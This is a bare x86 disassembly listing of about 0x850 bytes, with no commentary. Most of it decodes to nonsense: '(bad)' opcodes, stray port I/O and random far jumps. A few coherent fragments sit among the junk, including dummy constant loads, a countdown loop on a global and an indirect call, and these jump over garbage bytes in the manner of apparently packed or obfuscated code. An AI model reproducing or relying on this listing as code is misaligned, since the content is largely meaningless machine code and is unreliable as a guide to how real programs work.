  415d6f:	stc    
  415d70:	mov    edx,DWORD PTR [edi-0x22]
  415d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d74:	cmc    
  415d75:	jp     0x415d4f
  415d77:	loopne 0x415d0b
  415d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d7a:	in     eax,dx
  415d7b:	pop    ebx
  415d7c:	lods   al,BYTE PTR ds:[esi]
  415d7d:	push   es
  415d7e:	leave  
  415d7f:	or     BYTE PTR [edi+0x75],dl
  415d82:	jge    0x415db1
  415d84:	mov    esi,0x5c6859d7
  415d89:	dec    edx
  415d8a:	hlt    
  415d8b:	sbb    eax,0xee61c3b0
  415d90:	push   ebx
  415d91:	mov    DWORD PTR [ebp-0x6a4b0189],ecx
  415d97:	lods   eax,DWORD PTR ds:[esi]
  415d98:	mov    BYTE PTR [ebp+0xf92049d],dh
  415d9e:	arpl   WORD PTR [ebx],sp
  415da0:	mov    BYTE PTR [edi-0x284eaf6d],dh
  415da6:	mov    bl,BYTE PTR [edi]
  415da8:	jns    0x415da1
  415daa:	js     0x415dbd
  415dac:	push   es
  415dad:	loopne 0x415d65
  415daf:	(bad)  
  415db0:	std    
  415db1:	out    dx,eax
  415db2:	push   edx
  415db3:	jmp    0x1b82:0x78e35ad5
  415dba:	jo     0x415dc0
  415dbc:	mov    edx,DWORD PTR [ecx]
  415dbe:	add    eax,0xb9458f86
  415dc3:	jne    0x415e16
  415dc5:	cld    
  415dc6:	loop   0x415d75
  415dc8:	mov    DWORD PTR [ebx],esi
  415dca:	cmc    
  415dcb:	xor    eax,0x15bc0583
  415dd0:	xor    al,0xa9
  415dd2:	sub    DWORD PTR [edx-0x50],0x188e8755
  415dd9:	icebp  
  415dda:	loop   0x415db4
  415ddc:	jns    0x415e10
  415dde:	(bad)  
  415ddf:	fcomp  DWORD PTR [edi]
  415de1:	sub    eax,0x9fe51e0d
  415de6:	mov    ds:0x16cfd671,al
  415deb:	jmp    0xea9d:0xdf9c2cce
  415df2:	(bad)  
  415df3:	test   eax,0xa2256c61
  415df8:	in     eax,0xab
  415dfa:	repz shr DWORD PTR [esi-0x254e9fbe],1
  415e01:	xchg   edx,eax
  415e02:	outs   dx,DWORD PTR ds:[esi]
  415e03:	pop    ebp
  415e04:	jne    0x415e3e
  415e06:	(bad)  
  415e07:	cld    
  415e08:	scas   eax,DWORD PTR es:[edi]
  415e09:	adc    dl,dh
  415e0b:	and    DWORD PTR [eax+esi*1-0x37],edi
  415e0f:	(bad)  
  415e10:	push   ds
  415e11:	(bad)  
  415e12:	std    
  415e13:	or     eax,0x11ccb01a
  415e18:	mov    ds:0xfad67857,eax
  415e1d:	out    0x94,eax
  415e1f:	jnp    0x415def
  415e21:	iret   
  415e22:	rol    DWORD PTR [ebp+eax*8+0x6c],0xf7
  415e27:	xchg   esi,eax
  415e28:	push   ebx
  415e29:	sub    eax,0xf3273eb0
  415e2e:	pop    ss
  415e2f:	mov    edi,0x63b01d40
  415e34:	addr16 jb 0x415e40
  415e37:	mov    dl,0x88
  415e39:	pop    esi
  415e3a:	es inc ebx
  415e3c:	cmc    
  415e3d:	nop
  415e3e:	mov    DWORD PTR [ecx-0x50b50082],0xaf66ac08
  415e48:	xchg   esp,eax
  415e49:	fstp   QWORD PTR [edx+0x45]
  415e4c:	xchg   ebx,eax
  415e4d:	or     edx,DWORD PTR [ebx+ebp*2]
  415e50:	or     eax,0x6e47ed31
  415e55:	daa    
  415e56:	sub    al,0x70
  415e58:	xchg   ebp,eax
  415e59:	pop    ecx
  415e5a:	or     al,0x6
  415e5c:	inc    esi
  415e5d:	mov    cl,0x1d
  415e5f:	inc    eax
  415e60:	lds    ebp,FWORD PTR [esi]
  415e62:	mov    eax,ds:0xf98392ac
  415e67:	xchg   ecx,eax
  415e68:	or     dh,bl
  415e6a:	push   esp
  415e6b:	cmp    eax,0xde69f07
  415e70:	xlat   BYTE PTR ds:[ebx]
  415e71:	and    edi,0xffffff9c
  415e74:	ds jl  0x415eea
  415e77:	arpl   WORD PTR [ecx],dx
  415e79:	push   edi
  415e7a:	sub    BYTE PTR [edi+0x64f34864],bl
  415e80:	ficom  WORD PTR [ebp+0x57ee0ddb]
  415e86:	(bad)  
  415e87:	aam    0x49
  415e89:	mov    ds:0xfb70a05c,al
  415e8e:	xor    al,0x24
  415e90:	or     DWORD PTR [ebp+0x2e],edi
  415e93:	aad    0x27
  415e95:	ret    
  415e96:	mov    BYTE PTR [esi+0xb517b73],dh
  415e9c:	adc    DWORD PTR [ebx],edx
  415e9e:	inc    edx
  415e9f:	mov    DWORD PTR [edi-0x3aa2e772],ecx
  415ea5:	jbe    0x415f0a
  415ea7:	in     al,dx
  415ea8:	int    0x1f
  415eaa:	aam    0xb5
  415eac:	or     BYTE PTR [esi-0x299aaf65],0x39
  415eb3:	mov    DWORD PTR [ebx],esi
  415eb5:	jo     0x415ef0
  415eb7:	retf   0xe37b
  415eba:	lahf   
  415ebb:	push   edx
  415ebc:	and    eax,0x8a3e3669
  415ec1:	mov    dh,0x57
  415ec3:	hlt    
  415ec4:	fs ss fldpi 
  415ec8:	outs   dx,BYTE PTR ds:[esi]
  415ec9:	repnz aad 0xc7
  415ecc:	mov    edi,0x50c7d6dc
  415ed1:	repz jo 0x415e6b
  415ed4:	and    DWORD PTR [esi+0x62],ebx
  415ed7:	or     edx,DWORD PTR [ebx]
  415ed9:	and    ah,BYTE PTR [esi+edx*4]
  415edc:	adc    al,0xdd
  415ede:	jno    0x415e65
  415ee0:	sahf   
  415ee1:	inc    edx
  415ee2:	(bad)  
  415ee3:	mov    ds:0x4589d71f,al
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	lds    ecx,FWORD PTR [edi]
  415f4c:	aam    0xa9
  415f4e:	daa    
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f61
  415f57:	data16 repnz test BYTE PTR [eax+0x13f4bbe9],ch
  415f5f:	test   BYTE PTR [eax-0x23e13b84],bh
  415f65:	lahf   
  415f66:	mov    esp,0xe9ff2d67
  415f6b:	sbb    ebx,DWORD PTR [ecx+edx*1+0x57739869]
  415f72:	xor    dl,BYTE PTR [ebx+0x49211fa7]
  415f78:	sbb    ecx,edx
  415f7a:	in     eax,dx
  415f7b:	in     eax,0xe2
  415f7d:	xor    ebp,DWORD PTR [edi]
  415f7f:	outs   dx,DWORD PTR ds:[esi]
  415f80:	adc    BYTE PTR [edx-0x11],cl
  415f83:	and    bl,ch
  415f85:	inc    eax
  415f86:	pop    ss
  415f87:	mov    BYTE PTR [edx-0x76],dh
  415f8a:	sub    dh,BYTE PTR [edx]
  415f8c:	or     bh,al
  415f8e:	(bad)  
  415f8f:	xor    eax,0x7499d121
  415f94:	jbe    0x415fca
  415f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f97:	pop    ebx
  415f98:	arpl   WORD PTR [esi],bp
  415f9a:	dec    eax
  415f9b:	lahf   
  415f9c:	sub    ebp,DWORD PTR [ecx]
  415f9e:	fnstenv [ebx+0x448e1b1e]
  415fa4:	retf   
  415fa5:	fldcw  WORD PTR [esi+0x59bfd8ad]
  415fab:	mov    ?,WORD PTR [esi-0x1bb97e1d]
  415fb1:	jge    0x415f43
  415fb3:	mov    al,ds:0xb259ee1d
  415fb8:	loopne 0x415fbb
  415fba:	pop    ecx
  415fbb:	call   0xfeb1bbed
  415fc0:	repnz inc ebp
  415fc2:	jecxz  0x415f90
  415fc4:	and    dl,BYTE PTR [esi+ebp*4-0x1c]
  415fc8:	jnp    0x416022
  415fca:	fnsave [esi-0x4f]
  415fcd:	adc    edx,DWORD PTR [edi+0x42da2c5d]
  415fd3:	(bad)  
  415fd4:	jmp    0x69b820ee
  415fd9:	aad    0xde
  415fdb:	inc    edi
  415fdc:	adc    DWORD PTR [esi+0xbcb5c3c],0x1c
  415fe3:	sbb    DWORD PTR [edi],edx
  415fe5:	adc    BYTE PTR [esi-0x1],dh
  415fe8:	mov    esi,0xb85187a5
  415fed:	mov    DWORD PTR [edx-0x1c],eax
  415ff0:	aad    0x5e
  415ff2:	adc    al,0xc9
  415ff4:	fidiv  DWORD PTR [edx+ebp*1-0x31]
  415ff8:	je     0x416022
  415ffa:	addr16 (bad) 
  415ffc:	fcmovnbe st,st(7)
  415ffe:	mov    gs,WORD PTR [edx-0x5e]
  416001:	scas   al,BYTE PTR es:[edi]
  416002:	mov    BYTE PTR [edi+0x2c],0xc0
  416006:	out    0x6a,al
  416008:	push   es
  416009:	fwait
  41600a:	cwde   
  41600b:	xchg   ebx,eax
  41600c:	jl     0x416070
  41600e:	scas   eax,DWORD PTR es:[edi]
  41600f:	sbb    BYTE PTR [esi+0xf],dl
  416012:	mov    al,BYTE PTR [eax+esi*1-0x21]
  416016:	inc    esi
  416017:	and    edi,DWORD PTR [edi-0x7]
  41601a:	dec    ebp
  41601b:	dec    ebx
  41601c:	jnp    0x416051
  41601e:	int3   
  41601f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416020:	xor    eax,edi
  416022:	ret    
  416023:	and    eax,0xbe3dd1aa
  416028:	ret    0x81ed
  41602b:	cdq    
  41602c:	cmp    BYTE PTR [edi],ch
  41602e:	popa   
  41602f:	fldcw  WORD PTR [esi-0x1b]
  416032:	push   ebp
  416033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416034:	cmp    eax,0x7ad15569
  416039:	mov    cs,WORD PTR [ecx-0xd]
  41603c:	dec    edx
  41603d:	dec    esi
  41603e:	out    dx,al
  41603f:	push   edi
  416040:	repz repz cmp cl,bh
  416044:	stos   DWORD PTR es:[edi],eax
  416045:	mov    esp,esi
  416047:	fsub   QWORD PTR [ebx-0x68fbb0b8]
  41604d:	jl     0x416012
  41604f:	pop    eax
  416050:	pop    esp
  416051:	dec    ecx
  416052:	shrd   edi,ebp,cl
  416055:	sbb    ch,BYTE PTR [edi-0x422848d0]
  41605b:	mov    al,ds:0xc59f8493
  416060:	popf   
  416061:	in     al,dx
  416062:	cdq    
  416063:	shl    eax,1
  416065:	sti    
  416066:	sub    DWORD PTR ds:0xcff171a5,ecx
  41606c:	dec    ebp
  41606d:	(bad)  
  41606e:	mov    al,0xe6
  416070:	mov    ecx,0x1a179b40
  416075:	mov    esp,0x20effd82
  41607a:	sahf   
  41607b:	in     al,dx
  41607c:	repz mov esi,0xe766fda8
  416082:	mov    edx,0xb0bae942
  416087:	fstp   QWORD PTR [ebp-0x20]
  41608a:	test   BYTE PTR [edi],dh
  41608c:	cli    
  41608d:	inc    edx
  41608e:	jne    0x416083
  416090:	mov    dl,0x7
  416092:	mov    DWORD PTR [ecx],0x2cf7c035
  416098:	rol    BYTE PTR [eax],0x27
  41609b:	xor    cl,BYTE PTR [ecx-0x1f]
  41609e:	push   ecx
  41609f:	aad    0xbb
  4160a1:	ins    BYTE PTR es:[edi],dx
  4160a2:	out    0x92,al
  4160a4:	das    
  4160a5:	adc    BYTE PTR ss:[ebx+0x61932211],al
  4160ac:	aad    0x50
  4160ae:	shr    BYTE PTR [edi+0x6df03497],1
  4160b4:	jp     0x416066
  4160b6:	sub    edi,DWORD PTR [ecx+eiz*4]
  4160b9:	adc    eax,0xf8824b3e
  4160be:	int    0x6
  4160c0:	jecxz  0x4160a1
  4160c2:	sbb    eax,0x37fe3bea
  4160c7:	dec    ebp
  4160c8:	(bad)  
  4160c9:	fcmove st,st(3)
  4160cb:	pop    edi
  4160cc:	retf   
  4160cd:	and    BYTE PTR [ebp-0x55da6ef0],0x14
  4160d4:	dec    edx
  4160d5:	xchg   ecx,eax
  4160d6:	inc    eax
  4160d7:	add    eax,0xe029ad5c
  4160dc:	and    al,0x1c
  4160de:	fwait
  4160df:	jecxz  0x41613a
  4160e1:	aad    0x1e
  4160e3:	sub    eax,DWORD PTR [ebx]
  4160e5:	xlat   BYTE PTR cs:[ebx]
  4160e7:	mov    al,ds:0x4a6a56c5
  4160ec:	push   ss
  4160ed:	cs inc esi
  4160ef:	mov    cl,cl
  4160f1:	fmul   QWORD PTR [ebp+0x2da582b5]
  4160f7:	nop
  4160f8:	or     DWORD PTR [ebp-0x291954f2],eax
  4160fe:	jbe    0x4160d4
  416100:	lea    ebp,[edx]
  416102:	sbb    eax,0x2e39626e
  416107:	pop    ebx
  416108:	hlt    
  416109:	arpl   WORD PTR [ecx+0x6cf7bb6a],bp
  41610f:	xor    esi,esp
  416111:	jle    0x4160dc
  416113:	in     eax,dx
  416114:	adc    BYTE PTR [esi],ah
  416116:	gs leave 
  416118:	je     0x416136
  41611a:	ds or  bl,dh
  41611d:	fcmovnbe st,st(2)
  41611f:	push   ecx
  416120:	lea    ebx,[edi+0x74fea4a3]
  416126:	out    dx,al
  416127:	test   BYTE PTR cs:[ebx+0x7abb16a4],bl
  41612e:	mov    bl,0x8c
  416130:	cdq    
  416131:	adc    esi,edi
  416133:	mov    edx,0x2dbcb93
  416138:	and    esp,ebx
  41613a:	test   eax,0x53ee5168
  41613f:	xor    edx,0x71fca797
  416145:	leave  
  416146:	adc    BYTE PTR ds:[eax-0x18],bl
  41614a:	(bad)  
  41614b:	cld    
  41614c:	add    dl,BYTE PTR [ecx-0x4ef2c7a1]
  416152:	mov    ebx,0x8e230d35
  416157:	lods   al,BYTE PTR ds:[esi]
  416158:	out    0xaa,eax
  41615a:	les    edx,FWORD PTR [ebp-0xd]
  41615d:	sub    bh,BYTE PTR [esi]
  41615f:	sbb    eax,0x5ed872f6
  416164:	js     0x4160f1
  416166:	scas   al,BYTE PTR es:[edi]
  416167:	mov    eax,ds:0x39878af2
  41616c:	stos   DWORD PTR es:[edi],eax
  41616d:	pop    edi
  41616e:	dec    eax
  41616f:	add    eax,edx
  416171:	ins    BYTE PTR es:[edi],dx
  416172:	(bad)  
  416173:	mov    al,0xa5
  416175:	imul   edx,DWORD PTR [ecx],0xffffff82
  416178:	adc    ah,bh
  41617a:	std    
  41617b:	fdivr  st,st(1)
  41617d:	jne    0x41619b
  41617f:	loope  0x41614f
  416181:	xor    al,0xed
  416183:	xchg   ebp,eax
  416184:	data16 (bad) 
  416186:	fld    TBYTE PTR [edi+0x7c46a7e8]
  41618c:	xor    bh,ah
  41618e:	jno    0x416124
  416190:	sbb    ah,bl
  416192:	xchg   esp,eax
  416193:	xchg   esi,eax
  416194:	mov    esp,0xdf7be6fc
  416199:	lea    esp,[esi-0x7d]
  41619c:	and    DWORD PTR [esi],esp
  41619e:	out    0x65,al
  4161a0:	cmc    
  4161a1:	push   ss
  4161a2:	and    BYTE PTR [edi-0x68],ah
  4161a5:	adc    eax,0xcf2853cb
  4161aa:	imul   ecx,DWORD PTR [ecx],0x2e
  4161ad:	xchg   edx,eax
  4161ae:	and    BYTE PTR [esi-0x62],al
  4161b1:	scas   al,BYTE PTR es:[edi]
  4161b2:	adc    dh,BYTE PTR [edx+0x42]
  4161b5:	dec    edi
  4161b6:	mov    ah,0x61
  4161b8:	fistp  WORD PTR [ebp+0x78d13356]
  4161be:	scas   al,BYTE PTR es:[edi]
  4161bf:	mov    esp,0xf5482f1e
  4161c4:	jge    0x41617e
  4161c6:	cli    
  4161c7:	mov    bl,0xbc
  4161c9:	jnp    0x4161ba
  4161cb:	je     0x416151
  4161cd:	xor    bl,BYTE PTR [eax+0x73]
  4161d0:	sbb    al,0x60
  4161d2:	dec    eax
  4161d3:	aas    
  4161d4:	push   edi
  4161d5:	sub    DWORD PTR [eax],0xb19b89c9
  4161db:	loopne 0x4161f2
  4161dd:	popa   
  4161de:	mov    esp,0x3e226e36
  4161e3:	adc    DWORD PTR [esi-0x6d],0xfb2af864
  4161ea:	xor    esp,esp
  4161ec:	xor    eax,0x6de83a6d
  4161f1:	mov    eax,DWORD PTR [ebp-0x4]
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x5a02a846]
  416290:	ret    0x18bc
  416293:	jg     0x41630d
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x416273
  41629a:	sbb    DWORD PTR [edx-0x7e5ccf4d],edi
  4162a0:	or     BYTE PTR [edi],dl
  4162a2:	(bad)  
  4162a3:	jmp    0x3104:0x5b00c6b3
  4162aa:	mov    dl,BYTE PTR [ecx+0x39e6d1b2]
  4162b0:	into   
  4162b1:	fwait
  4162b2:	stc    
  4162b3:	inc    ebp
  4162b4:	push   esp
  4162b5:	sub    DWORD PTR ds:0x45c25116,esi
  4162bb:	xchg   ebp,eax
  4162bc:	adc    BYTE PTR [edx],ch
  4162be:	jp     0x4162a6
  4162c0:	xor    bh,ch
  4162c2:	shr    ebp,1
  4162c4:	mov    ah,BYTE PTR [ebx+0x4b]
  4162c7:	(bad)  [ecx+edi*4]
  4162ca:	loopne 0x416302
  4162cc:	mov    ebx,0xbae362
  4162d1:	(bad)  
  4162d2:	adc    al,0xef
  4162d4:	pop    esp
  4162d5:	push   0x3
  4162d7:	jb     0x416261
  4162d9:	mov    BYTE PTR [esp+eiz*8-0x20],0xa5
  4162de:	gs jns 0x416306
  4162e1:	ficom  DWORD PTR [esi-0x32ba271d]
  4162e7:	xor    DWORD PTR [eax+ebx*4],edx
  4162ea:	inc    eax
  4162eb:	hlt    
  4162ec:	(bad)  
  4162ed:	fimul  DWORD PTR [esi+0x485d857f]
  4162f3:	pusha  
  4162f4:	fwait
  4162f5:	dec    ecx
  4162f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162f7:	ficom  DWORD PTR gs:[eax-0x54]
  4162fb:	jae    0x416374
  4162fd:	pushf  
  4162fe:	mov    WORD PTR [ebx+ebx*4-0x2c023af7],ds
  416305:	shr    DWORD PTR [edi],cl
  416307:	inc    ebx
  416308:	inc    esi
  416309:	sbb    ebx,DWORD PTR [ebx+0x390cf466]
  41630f:	test   al,0x18
  416311:	lahf   
  416312:	fsubr  DWORD PTR [esi+ebp*1-0x461739d0]
  416319:	jmp    0x43de:0x3409df0a
  416320:	xchg   edx,eax
  416321:	or     al,al
  416323:	aad    0xee
  416325:	call   0xb0626358
  41632a:	(bad)  
  41632c:	out    dx,eax
  41632d:	jb     0x4162b1
  41632f:	aad    0x28
  416331:	test   WORD PTR [edx-0x14c6b87a],0x47a8
  41633a:	mov    esi,es
  41633c:	mov    ebx,0xaf038887
  416341:	test   eax,0xd2377037
  416346:	push   cs
  416347:	add    ch,bh
  416349:	gs in  eax,dx
  41634b:	xlat   BYTE PTR ds:[ebx]
  41634c:	bnd ret 0xa9b7
  416350:	adc    BYTE PTR ss:[eax-0x2103e425],cl
  416357:	repz in al,dx
  416359:	mov    ch,0x9b
  41635b:	xor    eax,esi
  41635d:	aam    0x66
  41635f:	(bad)  
  416362:	(bad)  
  416363:	dec    ebx
  416364:	pop    ds
  416365:	std    
  416366:	aaa    
  416367:	in     eax,0xfd
  416369:	test   esp,esi
  41636b:	repnz or BYTE PTR [edx+0x4a],al
  41636f:	cmp    BYTE PTR [ebx+0x63268995],ch
  416375:	inc    ebx
  416376:	out    dx,al
  416377:	inc    esi
  416378:	cmp    DWORD PTR [edx-0xa],eax
  41637b:	int3   
  41637c:	out    0xc8,eax
  41637e:	sbb    BYTE PTR ss:[ecx],cl
  416381:	lahf   
  416382:	sahf   
  416383:	dec    ecx
  416384:	into   
  416385:	pop    edx
  416386:	test   al,0x96
  416388:	jbe    0x4163a6
  41638a:	ins    DWORD PTR es:[edi],dx
  41638b:	cmp    al,0x8e
  41638d:	in     al,dx
  41638e:	dec    edi
  41638f:	add    esp,DWORD PTR [ebx-0x9]
  416392:	mov    esi,0x15856ddc
  416397:	push   esp
  416398:	xchg   ebx,eax
  416399:	adc    ebx,DWORD PTR ds:0x917a8bda
  41639f:	xor    BYTE PTR [ebx-0x64],al
  4163a2:	shl    eax,1
  4163a4:	leave  
  4163a5:	xor    eax,0x6821e832
  4163aa:	lock cmp edi,DWORD PTR [ebp+0x23]
  4163ae:	pushf  
  4163af:	inc    edi
  4163b0:	pushf  
  4163b1:	jp     0x4163b5
  4163b3:	push   es
  4163b4:	sbb    BYTE PTR [eax],bh
  4163b6:	aaa    
  4163b7:	data16 xlat BYTE PTR ds:[ebx]
  4163b9:	aas    
  4163ba:	and    al,0xb1
  4163bc:	into   
  4163bd:	sub    eax,0xe2aa03e9
  4163c2:	lds    ecx,FWORD PTR [ebp-0x1a]
  4163c5:	add    BYTE PTR [ebx],ch
  4163c7:	add    eax,0x62f20899
  4163cc:	sbb    ecx,DWORD PTR [ebp-0x2282fe8d]
  4163d2:	rol    DWORD PTR [edx],cl
  4163d4:	cdq    
  4163d5:	mov    edx,ebx
  4163d7:	imul   ecx
  4163d9:	stc    
  4163da:	mov    esp,0xc8e7445
  4163df:	and    eax,0x664ddb05
  4163e4:	cmp    eax,0x9ca4332a
  4163e9:	lods   eax,DWORD PTR ds:[esi]
  4163ea:	mov    bl,0x46
  4163ec:	retf   0xbf61
  4163ef:	das    
  4163f0:	dec    ecx
  4163f1:	cwde   
  4163f2:	xlat   BYTE PTR ds:[ebx]
  4163f3:	xchg   esp,eax
  4163f4:	es jnp 0x4163e8
  4163f7:	(bad)  
  4163f8:	xchg   esi,eax
  4163f9:	or     DWORD PTR [ecx+0x47594258],0xffffff93
  416400:	add    dl,BYTE PTR ds:0x709a1aee
  416406:	jbe    0x416485
  416408:	inc    edx
  416409:	mov    ds:0xfb3c2ff4,al
  41640e:	sbb    bl,ah
  416410:	pop    ds
  416411:	cwde   
  416412:	int    0x25
  416414:	dec    edi
  416415:	pusha  
  416416:	call   FWORD PTR [eax+eax*4]
  416419:	adc    edx,0x52
  41641c:	cmp    eax,0x216d53f5
  416421:	sbb    BYTE PTR [ecx+0x13],bl
  416424:	clc    
  416425:	enter  0x4da4,0x1e
  416429:	mov    bh,0xfe
  41642b:	inc    esi
  41642c:	fs cwde 
  41642e:	or     cl,BYTE PTR [eax+0x6287b2f8]
  416434:	or     eax,0xbf8d996b
  416439:	outs   dx,BYTE PTR ds:[esi]
  41643a:	mov    edi,0x8a8a20d
  41643f:	mov    ecx,DWORD PTR [esp+eax*4]
  416442:	xor    BYTE PTR [esi-0x71],dl
  416445:	stos   BYTE PTR es:[edi],al
  416446:	rcr    ebx,cl
  416448:	dec    esp
  416449:	push   0xf999042b
  41644e:	push   edi
  41644f:	inc    esi
  416450:	lods   al,BYTE PTR ds:[esi]
  416451:	xor    dl,BYTE PTR [eax+0xb6eb26b]
  416457:	(bad)  [eax+0xb]
  41645a:	cmc    
  41645b:	pop    ebx
  41645c:	mov    ds:0xb1956bb0,eax
  416461:	inc    ebp
  416462:	cwde   
  416463:	add    al,0x2b
  416465:	mov    bh,BYTE PTR [eax-0x56]
  416468:	fsub   QWORD PTR [edx]
  41646a:	mov    ecx,0xe71b8851
  41646f:	outs   dx,DWORD PTR ds:[esi]
  416470:	push   edx
  416471:	cmp    edi,DWORD PTR [edi-0x3]
  416474:	daa    
  416475:	mov    esi,0xfcbb7f57
  41647a:	ins    BYTE PTR es:[edi],dx
  41647b:	ds in  al,0x30
  41647e:	mov    esi,0x14eb78a2
  416483:	dec    ebp
  416484:	loop   0x41642c
  416486:	sti    
  416487:	pop    edi
  416488:	inc    edi
  416489:	enter  0x9eba,0x2f
  41648d:	out    dx,al
  41648e:	or     al,0xe
  416490:	leave  
  416491:	test   ecx,ecx
  416493:	pop    edx
  416494:	mov    dl,0x44
  416496:	mov    es,WORD PTR [edi+0x5acd3e4c]
  41649c:	mov    al,ds:0x4e1b6159
  4164a1:	pop    ebp
  4164a2:	adc    dh,al
  4164a4:	out    dx,al
  4164a5:	test   DWORD PTR [esi+0x320d531f],esi
  4164ab:	mov    al,ds:0xad74ce25
  4164b0:	fsub   QWORD PTR [ebx-0xf]
  4164b3:	xor    ebx,edx
  4164b5:	dec    ecx
  4164b6:	aad    0xa9
  4164b8:	sub    al,0x4
  4164ba:	dec    ebp
  4164bb:	test   BYTE PTR [ecx+0x71],dh
  4164be:	out    0x5e,eax
  4164c0:	mov    DWORD PTR [eax-0x78],eax
  4164c3:	aaa    
  4164c4:	popa   
  4164c5:	xchg   edi,eax
  4164c6:	stc    
  4164c7:	call   0x5ef5:0x94c28859
  4164ce:	push   DWORD PTR [edi+0x74]
  4164d1:	mov    bl,ch
  4164d3:	mov    WORD PTR [ebx+0x4e],?
  4164d6:	mov    ebx,0xc7b74efe
  4164db:	mov    ch,0x60
  4164dd:	iret   
  4164de:	fwait
  4164df:	and    eax,0x3b1bef70
  4164e4:	jmp    0xf0f6f31c
  4164e9:	es (bad) 
  4164eb:	xor    bh,BYTE PTR [edi]
  4164ed:	pop    esp
  4164ee:	out    0x59,eax
  4164f0:	inc    ebp
  4164f1:	mov    cl,0xeb
  4164f3:	jg     0x416559
  4164f5:	jae    0x41653b
  4164f7:	cld    
  4164f8:	jle    0x4164dc
  4164fa:	xor    eax,0xf6eacd77
  4164ff:	mov    ds:0x25abb70d,al
  416504:	push   esi
  416505:	sub    edi,DWORD PTR [eax+0x22db442f]
  41650b:	out    dx,al
  41650c:	scas   al,BYTE PTR es:[edi]
  41650d:	(bad)  
  41650f:	outs   dx,DWORD PTR ds:[esi]
  416510:	sbb    BYTE PTR [edi+0x19],al
  416513:	pop    ds
  416514:	test   al,0xfd
  416516:	xor    bl,BYTE PTR [ecx-0x5ae95c00]
  41651c:	test   BYTE PTR [eax+0x785a050a],0x98
  416523:	dec    edx
  416524:	xor    DWORD PTR [edx+edx*4+0x73efc80a],ecx
  41652b:	fwait
  41652c:	add    DWORD PTR [edx-0x542a59ac],0x46
  416533:	stos   DWORD PTR es:[edi],eax
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x3b1c839a],cl
  416557:	dec    ecx
  416558:	dec    edi
  416559:	or     ecx,ebx
  41655b:	sbb    eax,0x7e95787f
  416560:	js     0x4165da
  416562:	jnp    0x416565
  416564:	sub    eax,0xc5d03a0
  416569:	dec    edi
  41656a:	ja     0x4165ca
  41656c:	sahf   
  41656d:	test   DWORD PTR [eax],esi
  41656f:	add    BYTE PTR [esi+0x4efd6d06],dl
  416575:	data16 rcl BYTE PTR [ebp-0x11cf1baa],1
  41657c:	cmp    eax,0xa4fb0b92
  416581:	mov    ?,WORD PTR [ebx]
  416583:	jae    0x416544
  416585:	stos   DWORD PTR es:[edi],eax
  416586:	cmp    bh,al
  416588:	or     edx,DWORD PTR [edi+0x428bb5f1]
  41658e:	fs xchg esi,eax
  416590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416591:	push   0xa6037dff
  416596:	popf   
  416597:	js     0x416562
  416599:	pop    ss
  41659a:	sub    cl,ch
  41659c:	and    BYTE PTR [ecx],ch
  41659e:	addr16 mov esp,0x192c5172
  4165a4:	sub    ebp,DWORD PTR [eax+0x37]
  4165a7:	mov    ecx,DWORD PTR [esi]
  4165a9:	leave  
  4165aa:	dec    eax
  4165ab:	lahf   
  4165ac:	mov    bh,0x19
  4165ae:	push   ebx
  4165af:	push   esi
  4165b0:	inc    ecx
  4165b1:	je     0x4165d3
